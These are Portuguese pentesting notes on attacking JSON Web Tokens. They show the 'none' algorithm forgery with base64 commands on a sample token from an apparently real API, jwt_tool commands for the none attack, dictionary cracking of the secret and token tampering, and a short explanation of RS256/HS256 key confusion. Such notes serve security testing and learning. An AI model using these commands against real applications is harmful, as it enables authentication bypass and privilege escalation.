JSON Web Tokens
========================

Fonte: <https://blog.intigriti.com/2021/07/27/hacker-tools-jwt_tool/?cn-reloaded=1>

Possiveis ataques JWT:

 - [Algorítmo "none"](JSON%20Web%20Tokens.md#NoneAlgorithm)
 - [Cracking the secret key](JSON%20Web%20Tokens.md#CrackingSecretKey)
 - [Public Key Confusion](JSON%20Web%20Tokens.md#PublicKeyConfusion)



## NoneAlgorithm

Exemplo de JWT:

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLWhtZy52ZW5kYXBwLmNvbS5iclwvdjFcL2F1dGhcL3NpZ24taW4iLCJpYXQiOjE2Nzk5Mjg5ODEsImV4cCI6MTY3OTkzMjU4MSwibmJmIjoxNjc5OTI4OTgxLCJqdGkiOiJZOEhLcU9LQ1ZYbTJrc3VDIiwic3ViIjo4MiwicHJ2IjoiNzE0NzAxYTZhYTFkYzM2ODI0Y2FhOGZkNDU3YzIyOTZhMGJjYWZkZSJ9.GEOEmIlxy7Oe_FtfqMSEnx-0RXnvTTXH8aHYxOZYnxc

Obter a primeira parte do JWT (todo o antes antes do primeiro ".") e executar o seguinte comando:

    echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
 
 ![qownnotes-media-OdvwTU](../../../media/qownnotes-media-OdvwTU.png)

Para obter o payload em texto claro, pegamos a segunda parte (tudo que tiver entre os dois ".") e executar o seguinte comando:

    echo eyJpc3MiOiJodHRwczpcL1wvYXBpLWhtZy52ZW5kYXBwLmNvbS5iclwvdjFcL2F1dGhcL3NpZ24taW4iLCJpYXQiOjE2Nzk5Mjg5ODEsImV4cCI6MTY3OTkzMjU4MSwibmJmIjoxNjc5OTI4OTgxLCJqdGkiOiJZOEhLcU9LQ1ZYbTJrc3VDIiwic3ViIjo4MiwicHJ2IjoiNzE0NzAxYTZhYTFkYzM2ODI0Y2FhOGZkNDU3YzIyOTZhMGJjYWZkZSJ9 | base64 -d
 
Vide imagem acima para demonstracao:

O ataque em si consiste em alterar a primeira parte do JWT conforme o seguinte comando :

    echo -n '{"typ":"JWT","alg":"None"}' | base64
 
![qownnotes-media-NCWQbQ](../../../media/qownnotes-media-NCWQbQ.png)

Depois, devemos considerar a alteracao do payload para obter algum tipo de esccalacao de privilegio ou algo assim, no entanto, vale ressaltar que basta removermos a ultima parte do JWT e disparar para verificar se a aplicacao acata a requisicao.

### JWT_TOOL

Com essa ferramenta podemos utilizar o seguinte comando (-X a):

    python jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYXBpLWhtZy52ZW5kYXBwLmNvbS5iclwvdjFcL2F1dGhcL3NpZ24taW4iLCJpYXQiOjE2Nzk5Mjg5ODEsImV4cCI6MTY3OTkzMjU4MSwibmJmIjoxNjc5OTI4OTgxLCJqdGkiOiJZOEhLcU9LQ1ZYbTJrc3VDIiwic3ViIjo4MiwicHJ2IjoiNzE0NzAxYTZhYTFkYzM2ODI0Y2FhOGZkNDU3YzIyOTZhMGJjYWZkZSJ9.GEOEmIlxy7Oe_FtfqMSEnx-0RXnvTTXH8aHYxOZYnxc" -X a





## CrackingSecretKey

    python3 jwt_tool.py <<JWT_TOKEN>> -C -d <<DICT_FILE>>

## PublicKeyConfusion


CVE-2016-10555


RS256 signs the token asymmetrically. It uses private key to sign the token and public key to verify the token.
In case of — ‘HS256’ — signs the token symmetrically. It uses same key to sign and verify the token. The HMAC key and RSA private key are secret, is not known to public but the RSA public key is known to public.

## Tampering JWT

    python3 jwt_tool.py <<JWT_TOKEN>> -T